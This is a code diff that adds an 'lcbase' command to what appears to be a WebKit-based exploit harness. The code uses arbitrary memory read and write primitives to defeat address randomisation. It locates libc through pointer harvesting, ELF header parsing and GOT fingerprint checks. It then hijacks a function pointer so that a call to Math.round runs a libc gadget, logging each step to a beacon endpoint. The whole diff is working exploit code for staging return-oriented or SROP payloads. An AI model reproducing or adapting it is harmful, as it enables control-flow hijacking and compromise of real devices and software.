@@ -6165,6 +6165,190 @@ function _startWsShell(){
         break;
       }
 
+      case 'lcbase':{
+        /* THE DETERMINISTIC LIBC HUNT (the post-lottery instrument):
+         * the game-lane corpus gave us: the 12 known libc function RVAs
+         * (memcpy 0x42410, setjmp 0xB020, longjmp 0xB070, Thrd_create
+         * 0x4C3C0, ... two boots cross-checked) + the corpus-libc GOT
+         * fingerprint (libc+0x1179A8 == lk+0xB50 gettimeofday, and
+         * libc+0x117AE8 == lk+0x3F0 thr_exit - the DOUBLE ANCHOR).
+         * FLOW: harvest (MODULE BAND ONLY: [0x400000000,0x10000000000)
+         * minus lk/WebKit/pthread/stack - the packed-int floor and the
+         * JS-doubles are 0x1-band = excluded by construction) ->
+         * cluster -> (a) THE ALIGNMENT ORACLE: for every pointer P and
+         * every known RVA R: B=P-R 16KB-aligned = a base tally; a base
+         * with >=2 tallies = strong -> verify; (b) else ELF at the
+         * cluster's aligned values + a BOUNDED down-march (in-module
+         * steps = mapped; max 0x140000 span, per-step beacons); on any
+         * ELF: phdr size check -> if tall enough read +0x1179A8 (the
+         * fingerprint) -> else walk ITS .dynamic -> GOT import
+         * pointers -> oracle again. (c) THE RAX PROBE (if the base
+         * lands): rawcall(libc+0x611e7 = mov [rdi],rax; ret) - RAX-at-
+         * entry lands in scope[0], the gadget returns cleanly = ZERO
+         * RISK - the value decides the fire design (SROP via
+         * setjmp/longjmp pivot vs direct). ALL steps beaconed (LCB-n).*/
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function LB(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LCB-'+s),false);x.send();}catch(e){}}
+        try{
+          var cfrL=S.cfr;
+          /* (1) lk chain */
+          var lkBL=0n;
+          {
+            var entL=S.absRead(0x10001c8000n,0x100);
+            var trPL=0n;
+            for(var eiL=0;eiL<entL.length;eiL++){if(entL[eiL]>=0x10001f0000n&&entL[eiL]<0x1000200000n){trPL=entL[eiL];break;}}
+            if(trPL===0n){reply.err='no thread-record ptr';break;}
+            var trL=S.absRead(trPL,0x60);
+            var ptL=0n;
+            for(var tiL=0;tiL<trL.length;tiL++){if(trL[tiL]>=0x880000000n&&trL[tiL]<0x900000000n){ptL=trL[tiL];break;}}
+            if(ptL===0n){reply.err='no pthread ptr';break;}
+            var ndL=ptL,qL=0n;
+            for(var hpL=0;hpL<5;hpL++){
+              var ppL=S.absRead(ndL,0x60);
+              qL=ppL[8];
+              if((qL&0x3fffn)===0x218n&&qL>0x800000000n)break;
+              ndL=qL-0x38n;
+            }
+            if((qL&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+            lkBL=qL-0x6C218n;
+            if(lkBL%0x4000n!==0n){reply.err='lk base unaligned';break;}
+            var canL=S.absRead(lkBL+0x751D0n,8)[0];
+            LB('1 lk=0x'+lkBL.toString(16)+' canary=0x'+canL.toString(16));
+            if(!(canL>0x1000000n)){reply.err='canary fail';break;}
+          }
+          reply.lk='0x'+lkBL.toString(16);
+          /* (2) harvest - MODULE BAND ONLY */
+          function foreignL(v){
+            if(v<0x400000000n||v>=0x10000000000n)return false;  /* the module band ONLY: kills the cage/packed-int floor AND the 0x1-band JS doubles */
+            if(S.BASE&&(v>=S.BASE&&v<S.BASE+0x8000000n))return false;
+            if(v>=lkBL&&v<lkBL+0x200000n)return false;
+            if(v>=0x880000000n&&v<0x900000000n)return false;      /* pthread band */
+            if(cfrL&&(v>cfrL-0x100000n&&v<cfrL+0x100000n))return false;
+            if(S.lowB&&S.jfuTop&&v>=S.lowB&&v<S.jfuTop)return false;
+            return true;
+          }
+          var valsL=[],seenL={};
+          function collectL(start,len,tag){
+            for(var off=0;off<len;off+=0x1000){
+              var ws;
+              try{ws=S.absRead(start+BigInt(off),0x1000);}catch(e){LB('c THROW '+tag+'@+0x'+off.toString(16));return;}
+              for(var wi=0;wi<ws.length;wi++){
+                var v=ws[wi];
+                if(!foreignL(v))continue;
+                var k=v.toString(16);
+                if(seenL[k])continue;
+                seenL[k]=1;valsL.push(v);
+                LB('v 0x'+v.toString(16));
+              }
+            }
+          }
+          var pgL=(cfrL/0x4000n)*0x4000n;
+          collectL(pgL,0x8000,'s');
+          var deepL=parseInt(msg.deep)||6;
+          for(var dL=1;dL<=deepL;dL++){
+            try{collectL(pgL-BigInt(dL*0x1000),0x1000,'d'+dL);}catch(e){}
+          }
+          LB('2 harvest n='+valsL.length);
+          /* (3) THE ALIGNMENT ORACLE FIRST - zero risk */
+          var RVAS=[0x42410n,0x37BF0n,0x366E0n,0x4CDB0n,0x4C3C0n,0x4C240n,0x4C1C0n,0x4C6E0n,0x4C6F0n,0x4C650n,0xB020n,0xB070n];
+          var tally={},bestB=0n,bestN=0;
+          for(var pi2=0;pi2<valsL.length;pi2++){
+            for(var ri2=0;ri2<RVAS.length;ri2++){
+              var B=valsL[pi2]-RVAS[ri2];
+              if(B<0x400000000n||B>=0x10000000000n)continue;
+              if((B&0x3fffn)!==0n)continue;
+              var k2=B.toString(16);
+              tally[k2]=(tally[k2]||0)+1;
+              if(tally[k2]>bestN){bestN=tally[k2];bestB=B;}
+            }
+          }
+          LB('3 oracle best=0x'+bestB.toString(16)+' n='+bestN);
+          reply.oracle={base:'0x'+bestB.toString(16),n:bestN};
+          /* the verify helper: ELF sanity + the double-anchor */
+          function verifyLibc(C){
+            try{
+              var eh=S.absRead(C,0x40);
+              if(Number(eh[0]&0xFFFFFFFFn)!==0x464C457Fn){LB('4 0x'+C.toString(16)+' not ELF');return null;}
+              LB('4 0x'+C.toString(16)+' ELF');
+              var phoff=eh[4];
+              var phnum=Number(eh[6]&0xFFFFn);
+              if(phnum<1||phnum>64)return null;
+              var end=0n,dynV=0n;
+              for(var pj2=0;pj2<phnum;pj2++){
+                var ph=S.absRead(C+phoff+BigInt(pj2*0x38),0x38);
+                var ty=Number(ph[0]&0xFFFFFFFFn);
+                if(ty===1){var e2=ph[2]+ph[5];if(e2>end)end=e2;}
+                if(ty===2)dynV=C+ph[2];
+              }
+              LB('5 0x'+C.toString(16)+' size=0x'+end.toString(16));
+              if(end<0x120000n){LB('5 too small');return null;}
+              var gt=S.absRead(C+0x1179A8n,8)[0];
+              var te=S.absRead(C+0x117AE8n,8)[0];
+              LB('6 0x'+C.toString(16)+' gt=0x'+gt.toString(16)+' te=0x'+te.toString(16));
+              if(gt===lkBL+0xB50n&&te===lkBL+0x3F0n){LB('7 *** LIBC CONFIRMED 0x'+C.toString(16)+' ***');return C;}
+              return null;
+            }catch(e3){LB('4 0x'+C.toString(16)+' verify fault');return null;}
+          }
+          var libc=0n;
+          /* (3a) oracle base strong -> verify */
+          if(bestN>=2){libc=verifyLibc(bestB)||0n;}
+          /* (3b) else: cluster + bounded down-march */
+          if(!libc){
+            valsL.sort(function(a,b){return a<b?-1:(a>b?1:0);});
+            var clsL=[],cur2=[];
+            for(var vi2=0;vi2<valsL.length;vi2++){
+              if(cur2.length&&valsL[vi2]-cur2[cur2.length-1]>0x100000n){clsL.push(cur2);cur2=[];}
+              cur2.push(valsL[vi2]);
+            }
+            if(cur2.length)clsL.push(cur2);
+            clsL.sort(function(a,b){return b.length-a.length;});
+            LB('8 clusters='+clsL.length+' good='+clsL.filter(function(c){return c.length>=3;}).length);
+            outer:
+            for(var ci3=0;ci3<clsL.length;ci3++){
+              var cl=clsL[ci3];
+              if(cl.length<3)continue;
+              var mn=cl[0];
+              var top=(mn/0x4000n)*0x4000n;
+              LB('9 cluster'+ci3+' min=0x'+mn.toString(16)+' n='+cl.length+' march 0x'+top.toString(16));
+              for(var st=0n;st<=80n;st++){
+                var C=top-st*0x4000n;
+                if(C<mn-0x140000n)break;
+                LB('a C=0x'+C.toString(16));
+                var mg;
+                try{mg=S.absRead(C,8)[0];}catch(e4){break;}
+                if(Number(mg&0xFFFFFFFFn)===0x464C457Fn){
+                  LB('b *** ELF 0x'+C.toString(16)+' ***');
+                  libc=verifyLibc(C)||0n;
+                  if(libc)break outer;
+                  break;
+                }
+              }
+            }
+          }
+          if(!libc){reply.err='no libc found (oracle best n='+bestN+')';break;}
+          reply.libc='0x'+libc.toString(16);
+          /* (4) THE RAX PROBE: rawcall(libc+0x611e7 = mov [rdi],rax; ret)
+           * - the rawcall mechanism (proven): zero scope, swap slot,
+           * hijack NE+0x28, Math.round(-5.7), restore, read scope[0].
+           * The gadget writes RAX-at-entry into scope[0] and returns
+           * cleanly to the trampoline = ZERO RISK, full reply. */
+          try{
+            for(var zr2=0;zr2<4;zr2++)S.absWrite(S.fakeScope+BigInt(zr2*8),0n);
+            if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+            var origFnP=S.absRead(S.neEntry.addr+0x28n,8)[0];
+            S.absWrite(S.neEntry.addr+0x28n,libc+0x611e7n);
+            try{Math.round(-5.7);}catch(e5){}
+            S.absWrite(S.neEntry.addr+0x28n,origFnP);
+            if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+            var raxV=S.absRead(S.fakeScope,8)[0];
+            reply.raxAtEntry='0x'+raxV.toString(16);
+            LB('c RAX-at-entry=0x'+raxV.toString(16));
+          }catch(e6){LB('c rax probe fault: '+String(e6&&e6.message?e6.message:'?'));}
+          LB('d done libc=0x'+libc.toString(16));
+        }catch(e7){reply.err='lcbase fault: '+String(e7&&e7.message?e7.message:'?');}
+        break;
+      }
+
       case 'lcarch':{
         /* THE ALL-IN-ONE (the cross-session-marching lesson): harvest ->
          * cluster -> march (top-down ELF-magic, in-page, per-step beacons)
